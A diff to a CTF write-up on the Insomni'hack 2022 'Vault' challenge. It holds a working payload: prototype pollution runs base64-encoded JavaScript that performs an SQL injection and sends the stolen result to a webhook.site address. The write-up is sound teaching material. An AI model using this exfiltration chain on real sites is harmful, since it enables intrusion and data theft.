@@ -3,7 +3,7 @@ title: Insomni'hack teaser 2022 – Vault
 date: '2022-01-31'
 draft: false
 authors: ['thebish0p']
-tags: ["Insomni'hack teaser 2022", 'Web', 'Prototype Pollution', 'SQLi', 'Error Based Injection']
+tags: ["Insomni'hack teaser 2022", 'Web', 'Prototype Pollution', 'SQLi', 'Error Based Injection', 'JavaScript', 'JSON']
 summary: 'Prototype pollution which allows to run arbitrary js in admin context and retrieve the flag through the sql injection with an error based injection.'
 ---
 
@@ -95,7 +95,13 @@ def stats():
 
 ```
 
-We continue by adding an injection to our payload `fetch("/api/stats?username=admin' union select 123 --").then(x => x.text()).then(x=>{location='https://webhook.site/32903bb4-075a-4196-933d-2d558ae4a216/?secrets='+btoa(x)})` but we base64 it and then eval the decoded value in order for it to work : `http://vault.insomnihack.ch:5000/?__proto__[url][]=data:,eval(atob(%27ZmV0Y2goIi9hcGkvc3RhdHM/dXNlcm5hbWU9YWRtaW4nIHVuaW9uIHNlbGVjdCAxMjMgLS0iKS50aGVuKHggPT4geC50ZXh0KCkpLnRoZW4oeD0%2be2xvY2F0aW9uPSdodHRwczovL3dlYmhvb2suc2l0ZS8zMjkwM2JiNC0wNzVhLTQxOTYtOTMzZC0yZDU1OGFlNGEyMTYvP3NlY3JldHM9JytidG9hKHgpfSk7%27))//&__proto__[dataType]=script#page=secrets` and get a callback as shown below:
+We continue by adding an injection to our payload `fetch("/api/stats?username=admin' union select 123 --").then(x => x.text()).then(x=>{location='https://webhook.site/32903bb4-075a-4196-933d-2d558ae4a216/?secrets='+btoa(x)})` but we base64 it and then eval the decoded value in order for it to work: 
+
+```
+http://vault.insomnihack.ch:5000/?__proto__[url][]=data:,eval(atob(%27ZmV0Y2goIi9hcGkvc3RhdHM/dXNlcm5hbWU9YWRtaW4nIHVuaW9uIHNlbGVjdCAxMjMgLS0iKS50aGVuKHggPT4geC50ZXh0KCkpLnRoZW4oeD0%2be2xvY2F0aW9uPSdodHRwczovL3dlYmhvb2suc2l0ZS8zMjkwM2JiNC0wNzVhLTQxOTYtOTMzZC0yZDU1OGFlNGEyMTYvP3NlY3JldHM9JytidG9hKHgpfSk7%27))//&__proto__[dataType]=script#page=secrets
+```
+
+…and get a callback as shown below:
 
 ![successful_injection](/static/images/insomnihack-teaser-2022/successful_injection.png)
 
